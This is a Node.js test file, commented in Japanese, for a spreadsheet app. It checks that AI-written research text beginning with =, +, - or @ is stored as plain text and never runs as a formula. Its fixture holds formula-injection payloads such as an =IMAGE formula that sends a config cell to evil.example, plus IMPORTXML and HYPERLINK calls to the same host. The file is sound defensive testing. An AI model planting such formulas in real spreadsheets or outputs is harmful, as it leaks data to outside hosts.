#!/usr/bin/env node
/**
 * app-ai-formula.test.mjs — A-4 AI 調査の守り: AI の文を数式にしない（提案 19）。2026-10-13 の点検（村井さん承認）。
 * AI の文が = + - @ で始まっても数式にしない（=IMAGE("https://…"&CONFIG!B2) の例）。旧来の A-4 が AI の文をセルに書くすべての所で、
 * そのセルの書式を文字にしてから書く。データ本体から組み立て直しても文字のまま。
 * 本物の旧来の A-4 を、決まった形の Vertex AI の答えで動かす（共通の道具は ai-stub.mjs）。モックの上の確かめで、本物の Apps Script・Vertex AI の上では動かしていない。
 *
 *   node app/tests/app-ai-formula.test.mjs
 */
import assert from 'node:assert/strict';
import { setUpEnv } from './gas-mock.mjs';
import { seed, stubVertex, setAi, research, structured, rowOf, EVIL } from './ai-stub.mjs';

const env = setUpEnv();
const FY = env.run('appFy_(new Date())');
stubVertex(env);

// ==== AI の文が = + - @ で始まっても数式にしない ====
{
  const p = seed(env, '数式製薬', FY);
  setAi(env, `__ai.citeTitle = '=IMPORTXML("https://evil.example","//a")';
    __ai.answers.Market = { report_text: ${JSON.stringify(EVIL)},
      web: { direction: 'up', impact_score: 60, confidence: 0.5, evidence: '=HYPERLINK("https://evil.example","x")', time_horizon: '6M', business_relevance_reason: '+SUM(1,2)', market_size_ref: '-5%' },
      report: { relative_percentile: 60, relative_confidence: 0.5, benchmark_quality: 'low', peer_universe: '同業', peer_basis: '売上', relative_reason: '@foo', evidence: '比べ' } };`);
  const st = research(env, p);
  assert.equal(st.status, 'DONE', st.error);
  const rows = structured(env, p);
  assert.ok(rows.every((r) => !r._types.includes('f')), 'データ本体の AI_RESEARCH_STRUCTURED に数式は無い: ' + rows.map((r) => r._types).join(','));
  const ev = rowOf(rows, 'Market', 'event');
  assert.equal(ev.evidence, '=HYPERLINK(https://evil.example,x)', '文字のまま（引用符は旧来の正規化が外す）');
  assert.equal(ev.business_relevance_reason, '+SUM(1,2)');
  assert.equal(ev.market_size_ref, '-5%', '「-」で始まる文も数に変えない');
  assert.match(rows[0].report_text, /【Market】\n=IMAGE\("https:\/\/evil\.example\/x\?"&CONFIG!B2\)/, '要約文（report_text）の中身はそのまま');
  // 旧来の要約の画面（AI_RESEARCH）: 話題ごとの要約文のセルも文字
  const ai = env.call(`appEngLoadPlanSheets_(__p, ['AI_RESEARCH']).AI_RESEARCH`, { __p: p });
  assert.deepEqual(ai.formulas.flat().filter(Boolean), [], 'AI_RESEARCH に数式は無い');
  assert.ok(ai.values.some((row) => row.includes(EVIL)), 'AI の要約文は文字として残る');
  // 計算用ブック: 「+」「@」で始まる文のセルも書式を文字にしてある（本物の Sheets は「+」「-」「@」も数式として読む）
  const scratch = env.scratch();
  const sh = scratch.getSheetByName('AI_RESEARCH_STRUCTURED');
  const vals = sh.getDataRange().getValues();
  const fmts = sh.getRange(1, 1, vals.length, vals[0].length).getNumberFormats();
  const fmtOf = (text) => { for (let r = 0; r < vals.length; r++) { const c = vals[r].indexOf(text); if (c >= 0) return fmts[r][c]; } return null; };
  assert.deepEqual(['=HYPERLINK(https://evil.example,x)', '+SUM(1,2)', '-5%', '@foo'].map(fmtOf), ['@', '@', '@', '@']);
  assert.notEqual(fmtOf('需要が伸びている'), '@', 'ふつうの文のセルの書式は変えない');
  // データ本体に移さない表（AI_RESEARCH_RAW）も、Web の題（出典）が「=」で始まっても数式にしない
  const raw = scratch.getSheetByName('AI_RESEARCH_RAW');
  assert.deepEqual(raw.getDataRange().getFormulas().flat().filter(Boolean), [], 'AI_RESEARCH_RAW に数式は無い');
  assert.ok(raw.getDataRange().getValues().some((row) => row.includes('=IMPORTXML(https://evil.example,//a)') || row.includes('=IMPORTXML("https://evil.example","//a")')), '題は文字のまま');
  // 組み立て直しても文字のまま（書式 → 値の順に書く。文字に固定し直すセルも無い）
  const rebuilt = env.call(`(() => {
    const ss = SpreadsheetApp.create('組み立て直し');
    const dec = appEngLoadPlanSheets_(__p, ['AI_RESEARCH', 'AI_RESEARCH_STRUCTURED']);
    return Object.keys(dec).map(n => { const w = appEngWriteSheet_(ss, dec[n]); const s = ss.getSheetByName(n);
      return { name: n, forced: w.forcedText, mismatches: w.mismatches, formulas: s.getRange(1, 1, s.getLastRow(), s.getLastColumn()).getFormulas().reduce((a, r) => a.concat(r.filter(Boolean)), []),
        evil: s.getDataRange().getValues().some(r => r.indexOf(__evil) >= 0) }; });
  })()`, { __p: p, __evil: EVIL });
  rebuilt.forEach((x) => assert.deepEqual([x.forced, x.mismatches, x.formulas], [0, 0, []], x.name + ': 組み立て直しても数式にならない'));
  assert.ok(rebuilt.find((x) => x.name === 'AI_RESEARCH').evil);
  setAi(env, "__ai.citeTitle = ''; __ai.answers = {};");
}

console.log('app-ai-formula: all tests passed');
